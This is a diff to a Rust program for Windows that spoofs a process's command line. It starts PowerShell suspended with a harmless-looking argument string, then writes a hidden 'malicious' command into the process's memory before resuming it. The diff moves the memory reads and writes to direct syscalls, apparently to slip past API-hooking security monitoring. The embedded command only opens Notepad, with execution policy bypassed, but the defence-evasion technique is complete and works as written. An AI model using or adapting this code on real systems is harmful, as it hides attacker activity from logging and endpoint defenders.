@@ -1,43 +1,25 @@
+#![allow(non_snake_case)]
 use std::mem::{size_of, zeroed};
+use std::ptr::null_mut;
 
-use windows::core::{PCWSTR, PWSTR};
-use windows::Win32::Foundation::{CloseHandle, NTSTATUS, HANDLE};
-use windows::Win32::Security::SECURITY_ATTRIBUTES;
-use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
-use windows::Win32::System::Threading::{
-    CreateProcessW, ResumeThread, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
-    PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW,
+use ntapi::ntpebteb::PEB;
+use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
+use rust_syscalls::syscall;
+use winapi::shared::minwindef::{DWORD, LPVOID};
+use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING};
+use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
+use winapi::um::processthreadsapi::{
+    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW,
 };
+use winapi::um::winbase::{CREATE_NEW_CONSOLE, CREATE_SUSPENDED};
+use winapi::um::winnt::{LPCWSTR, LPWSTR};
 
-#[link(name = "ntdll")]
-extern "system" {
-    fn NtQueryInformationProcess(
-        ProcessHandle: HANDLE,
-        ProcessInformationClass: u32,
-        ProcessInformation: *mut std::ffi::c_void,
-        ProcessInformationLength: u32,
-        ReturnLength: *mut u32,
-    ) -> NTSTATUS;
-}
-
-#[repr(C)]
-struct CustomPeb {
-    _filler: [u8; 16],
-    image_base_address: *mut std::ffi::c_void,
-    ldr: *mut std::ffi::c_void,
-    process_parameters: *mut CustomRtlUserProcessParameters,
-}
-
-#[repr(C)]
-struct CustomRtlUserProcessParameters {
-    _filler: [u8; 112],
-    length: u16,
-    maximum_length: u16,
-    command_line: PWSTR,
+fn to_wide_chars(s: &str) -> Vec<u16> {
+    s.encode_utf16().collect()
 }
 
 fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
-    let mut wide: Vec<u16> = s.encode_utf16().collect();
+    let mut wide = to_wide_chars(s);
     if wide.len() < total_width {
         wide.resize(total_width, padding_char);
     }
@@ -46,147 +28,147 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
 
 fn main() {
     let malicious_command = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
-    let malicious_command_wide: Vec<u16> = malicious_command.encode_utf16().collect();
+    let malicious_command_wide = to_wide_chars(malicious_command);
 
     let spoofed_command_str = "powershell.exe";
     let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
-    spoofed_command_wide.push(0); // Null terminate for CreateProcessW
+    spoofed_command_wide.push(0); // Null terminate
 
     let mut si: STARTUPINFOW = unsafe { zeroed() };
-    si.cb = size_of::<STARTUPINFOW>() as u32;
+    si.cb = size_of::<STARTUPINFOW>() as DWORD;
     let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
-    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
+    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as DWORD;
     let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };
 
-    let mut current_dir: Vec<u16> = "C:\\windows\\".encode_utf16().collect();
-    current_dir.push(0); // Null terminate
+    let mut current_dir = to_wide_chars("C:\\windows\\");
+    current_dir.push(0);
 
     let success = unsafe {
         CreateProcessW(
-            None,
-            PWSTR(spoofed_command_wide.as_mut_ptr()),
-            Some(&sa),
-            Some(&sa),
-            false,
+            null_mut(),
+            spoofed_command_wide.as_mut_ptr() as LPWSTR,
+            &mut sa,
+            &mut sa,
+            0,
             CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
-            None,
-            PCWSTR(current_dir.as_ptr()),
-            &si,
+            null_mut(),
+            current_dir.as_ptr() as LPCWSTR,
+            &mut si,
             &mut pi,
         )
     };
 
-    if success.is_err() {
-        println!("CreateProcessW failed: {:?}", success.err());
+    if success == 0 {
+        println!("CreateProcessW failed");
         return;
     }
 
     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
     let mut return_length: u32 = 0;
 
-    let status = unsafe {
-        NtQueryInformationProcess(
+    let mut status: NTSTATUS;
+    unsafe {
+        status = syscall!(
+            "NtQueryInformationProcess",
             pi.hProcess,
             0, // ProcessBasicInformation
-            &mut pbi as *mut _ as *mut std::ffi::c_void,
+            &mut pbi as *mut _ as LPVOID,
             size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-            &mut return_length,
-        )
-    };
+            &mut return_length
+        );
+    }
 
-    if status != NTSTATUS(0) {
-        println!("NtQueryInformationProcess failed with status: {:?}", status);
-        unsafe {
-            let _ = CloseHandle(pi.hProcess);
-            let _ = CloseHandle(pi.hThread);
-        }
+    if status != 0 {
+        println!("NtQueryInformationProcess failed");
+        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
         return;
     }
 
-    let mut peb: CustomPeb = unsafe { zeroed() };
+    let mut peb: PEB = unsafe { zeroed() };
     let mut bytes_read: usize = 0;
-    let success = unsafe {
-        ReadProcessMemory(
-            pi.hProcess,
-            pbi.PebBaseAddress as *const _,
-            &mut peb as *mut _ as *mut _,
-            size_of::<CustomPeb>(),
-            Some(&mut bytes_read as *mut _),
-        )
-    };
 
-    if success.is_err() || bytes_read != size_of::<CustomPeb>() {
-        println!("ReadProcessMemory for PEB failed: {:?}", success.err());
-        unsafe {
-            let _ = CloseHandle(pi.hProcess);
-            let _ = CloseHandle(pi.hThread);
-        }
+    unsafe {
+        status = syscall!(
+            "NtReadVirtualMemory",
+            pi.hProcess,
+            pbi.PebBaseAddress as LPVOID,
+            &mut peb as *mut _ as LPVOID,
+            size_of::<PEB>(),
+            &mut bytes_read
+        );
+    }
+
+    if status != 0 || bytes_read != size_of::<PEB>() {
+        println!("NtReadVirtualMemory for PEB failed");
+        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
         return;
     }
 
-    let mut proc_params: CustomRtlUserProcessParameters = unsafe { zeroed() };
-    let success = unsafe {
-        ReadProcessMemory(
+    #[repr(C)]
+    struct Params {
+        _filler: [u8; 0x70],
+        CommandLine: UNICODE_STRING,
+    }
+    let mut proc_params: Params = unsafe { zeroed() };
+    unsafe {
+        status = syscall!(
+            "NtReadVirtualMemory",
             pi.hProcess,
-            peb.process_parameters as *const _,
-            &mut proc_params as *mut _ as *mut _,
-            size_of::<CustomRtlUserProcessParameters>(),
-            Some(&mut bytes_read as *mut _),
-        )
-    };
+            peb.ProcessParameters as LPVOID,
+            &mut proc_params as *mut _ as LPVOID,
+            size_of::<Params>(),
+            &mut bytes_read
+        );
+    }
 
-    if success.is_err() || bytes_read != size_of::<CustomRtlUserProcessParameters>() {
-        println!("ReadProcessMemory for ProcessParameters failed: {:?}", success.err());
-        unsafe {
-            let _ = CloseHandle(pi.hProcess);
-            let _ = CloseHandle(pi.hThread);
-        }
+    if status != 0 || bytes_read != size_of::<Params>() {
+        println!("NtReadVirtualMemory for ProcessParameters failed");
+        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
         return;
     }
 
     let mut bytes_written: usize = 0;
-    let success = unsafe {
-        WriteProcessMemory(
+    unsafe {
+        status = syscall!(
+            "NtWriteVirtualMemory",
             pi.hProcess,
-            proc_params.command_line.as_ptr() as _,
-            malicious_command_wide.as_ptr() as _,
-            malicious_command_wide.len() * 2, // size in bytes
-            Some(&mut bytes_written as *mut _),
-        )
-    };
+            proc_params.CommandLine.Buffer,
+            malicious_command_wide.as_ptr() as LPVOID,
+            malicious_command_wide.len() * 2,
+            &mut bytes_written
+        );
+    }
 
-    if success.is_err() {
-        println!("WriteProcessMemory for command line failed: {:?}", success.err());
-        unsafe {
-            let _ = CloseHandle(pi.hProcess);
-            let _ = CloseHandle(pi.hThread);
-        }
+    if status != 0 {
+        println!("NtWriteVirtualMemory for command line failed");
+        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
         return;
     }
 
-    let cmd_line_len = (spoofed_command_str.len() * 2) as u16; // Length in bytes
-    let success = unsafe {
-        WriteProcessMemory(
-            pi.hProcess,
-            (peb.process_parameters as *mut u8).add(112) as _,
-            &cmd_line_len as *const _ as _,
-            size_of::<u16>(),
-            Some(&mut bytes_written as *mut _),
-        )
-    };
+    let cmd_line_len = (spoofed_command_str.len() * 2) as u16;
 
-    if success.is_err() {
-        println!("WriteProcessMemory for command line length failed: {:?}", success.err());
-        unsafe {
-            let _ = CloseHandle(pi.hProcess);
-            let _ = CloseHandle(pi.hThread);
-        }
+    unsafe {
+        let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
+        status = syscall!(
+            "NtWriteVirtualMemory",
+            pi.hProcess,
+            len_address as LPVOID,
+            &cmd_line_len as *const _ as LPVOID,
+            size_of::<u16>(),
+            &mut bytes_written
+        );
+    }
+
+    if status != 0 {
+        println!("NtWriteVirtualMemory for command line length failed");
+        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
         return;
     }
 
     unsafe {
-        let _ = ResumeThread(pi.hThread);
-        let _ = CloseHandle(pi.hProcess);
-        let _ = CloseHandle(pi.hThread);
+        let mut suspend_count: u32 = 0;
+        let _ = syscall!("NtResumeThread", pi.hThread, &mut suspend_count);
+        let _ = syscall!("NtClose", pi.hProcess);
+        let _ = syscall!("NtClose", pi.hThread);
     }
 }
